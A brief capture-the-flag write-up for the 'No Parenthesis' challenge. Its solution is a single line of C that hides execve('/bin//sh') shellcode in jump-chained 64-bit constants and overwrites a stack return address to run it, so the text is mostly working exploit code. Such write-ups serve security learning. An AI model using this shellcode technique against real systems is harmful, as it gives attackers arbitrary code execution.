# No Parenthesis

Solved by **XXX**

## Question
No parenthesis and all warnings treated as errors? Surely you can't write unsafe code to steal my flag....


## Solution
```
typedef unsigned long long size_t; void *voidptr; size_t*  tmp1; size_t** tmp2; size_t** stack; unsigned char* sc_start; size_t rop[6]; rop[0] = 0x06eb905299583b6a; rop[1] = 0x06eb9068732f6ebb; rop[2] = 0x06eb909020e3c148; rop[3] = 0x06eb9069622f2fbf; rop[4] = 0x06eb5f5453fb3148; rop[5] = 0x06eb050f5e545752; voidptr = &main; sc_start = voidptr; sc_start += 6;  voidptr = sc_start; tmp1 = voidptr; tmp2 = &tmp1; voidptr = &rop; stack = voidptr; stack[13] = *tmp2; return rop[0];
```

### Flag
[![bbcbc5a4-51f0-4089-9f5b-ee57f4b25c18.jpg](https://i.postimg.cc/RCYhtZ1X/bbcbc5a4-51f0-4089-9f5b-ee57f4b25c18.jpg)](https://postimg.cc/V5jzQ1VC)
